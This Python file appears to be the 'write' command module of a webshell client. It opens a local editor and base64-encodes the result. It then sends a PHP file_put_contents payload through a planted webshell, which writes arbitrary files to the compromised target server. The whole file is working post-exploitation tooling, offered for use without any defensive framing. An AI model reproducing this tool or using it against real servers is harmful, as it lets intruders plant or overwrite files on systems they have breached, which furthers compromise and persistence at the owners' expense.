from re import match
from os import path, makedirs, remove

from libs.config import alias, color, gget
# from libs.app import multi_input
from libs.myapp import send, base64_encode, open_editor


@alias(True, func_alias="w")
def run(web_file_path: str):
    """
    write

    Write files directly to the target system by notepad/vi.

    eg: write {web_file_path}
    """
    file_name = path.split(web_file_path)[1]
    file_path = gget("webshell.download_path", "webshell")
    if not path.exists(file_path):
        makedirs(file_path)
    real_file_path = path.join(file_path, file_name)
    with open(real_file_path, "w"):
        pass
    open_editor(real_file_path)
    with open(real_file_path, "r") as f:
        result = base64_encode(f.read())
        res = send(f"print(file_put_contents('{web_file_path}', base64_decode('{result}')));")
        if (not res):
            return
        text = res.r_text.strip()
        if (match(r"\w+", text) and text != '0'):
            print(color.green(f"\nWrite {web_file_path} success.\n"))
        else:
            print(color.red(f"\nWrite {web_file_path} failed.") + color.yellow("\n\nResponse:") + f"\n{text}\n")
    remove(real_file_path)
